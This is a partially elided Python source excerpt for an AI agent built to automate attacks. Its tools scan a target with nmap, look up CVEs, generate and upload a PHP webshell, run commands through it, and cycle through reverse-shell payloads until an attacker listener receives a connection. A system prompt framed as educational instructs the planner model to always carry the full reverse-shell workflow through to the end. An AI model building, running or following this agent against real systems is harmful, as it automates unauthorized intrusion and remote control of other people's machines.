...
class GeneratePayloadTool(AbstractTool):
    ...
    def use(self, payload_type: str, os_type: str = "", listener_ip: str = "", listener_port: int = 0) -> str:
        ...
        if payload_type.lower() == "webshell":
            ...
            # For reverse, we might not write to file if sending as cmd, but for consistency
    ...
    def use(self, target_ip: str, target_port: int, endpoint: str = '/', payload_file: str = 'payload.php') -> str:
        try:
            with open(payload_file, 'rb') as f:
                files = {'file': ('payload.php', f)}
                url = f"http://{target_ip}:{target_port}{endpoint}"
                response = requests.post(url, files=files, timeout=10)
            return f"Upload response: Status {response.status_code}, Content: {response.text[:200]}..."
        except Exception as e:
...
class ExecuteCmdTool(AbstractTool):
    ...
    def use(self, target_ip: str, target_port: int, webshell_path: str = '/uploads/payload.php', cmd: str = '') -> str:
        try:
            ...
            response = requests.get(url, timeout=10)
            return f"Execution response: {response.text[:200]}..."
        except Exception as e:
...
class TryMultiplePayloadsTool(AbstractTool):
    ...
    def use(self, os_type: str, listener_ip: str, listener_port: int, target_ip: str, target_port: int, webshell_path: str, nmap_summary: str, user_os: str = "MacOS") -> str:
        # Get likely ports (but since webshell is on specific port)
        # Instead, try multiple payloads as cmds
        ...
        for idx, section in enumerate(filtered_sections):
            ...
            try:
                conn, addr = server.accept()
                print(f"Success with payload {idx+1} from {addr}. Starting interactive shell...")
                if user_os == "MacOS":
                    helper_code = f"""
import socket
import sys
...
"""
                ...
                server.close()
                print(f"Payload {idx+1} failed. Trying next...")
            except Exception as e:
                server.close()
    ...
    def use(self, ip: str) -> str:
        try:
            ...
            for v in summary["vulnerabilities"]:
                ...
                vuln_block_lines.append(f" - Port {v['port']}, Script {v['script']}: {v['output'][:100]}... CVEs: {cves_str}")
...
def parse_nmap_xml(xml_text: str) -> dict:
    ...
    if ports_node:
        for p in ports_node.findall("port"):
            ...
            # Extract script outputs for vulns
            for script in p.findall("script"):
                ...
                for elem in elems:
                    if elem.get("key") == "id" and elem.text and 'CVE' in elem.text:
                        cves.add(elem.text)
                # Could parse tables for more, but regex for now
...
async def main():
    ...
    planner.prompt_builder.role_definition = RoleDefinition(
        "You are an expert cybersecurity analyst for educational demos on safe cyber ranges. ALWAYS complete the FULL workflow for reverse shell acquisition without skipping or assuming success. "
        "Step 1: Extract target IP from user input. "
        "Step 2: Call run_nmap and analyze summary for OS, ports, vulnerabilities, and CVEs. "
        "Step 3: For each CVE, call query_cve to get details, determine the most relevant CVE for exploitation (e.g., file upload vuln). "
        "Step 4: Call query_kb for reverse shell payloads based on OS, and for PHP webshell if file upload is possible. "
        "Step 5: Call get_attacker_ip. "
        "Step 6: Call generate_payload with payload_type='webshell' to create payload.php. "
        "Step 7: Call deploy_payload to upload to a suitable port (e.g., 80 for HTTP). "
        "Step 8: Call curl_page on the main page or after upload to parse response and find webshell path (look for 'access it via:' or assume /uploads/payload.php). Use reasoning to extract path. "
        "Step 9: Call generate_payload with payload_type='reverse', OS, IP, port (e.g., 2026) or select from KB, get the command string. "
        "Step 10: Call start_listener on the port. "
        "Step 11: Call execute_cmd with the webshell path and the reverse shell command. "
        "If any step fails, try alternatives like different ports/commands or call try_multiple_payloads. If all fails, final answer with what happened and ask user for further instructions. "
        "Provide status after EACH tool. Do not final answer until listener succeeds or all attempts fail."
    )
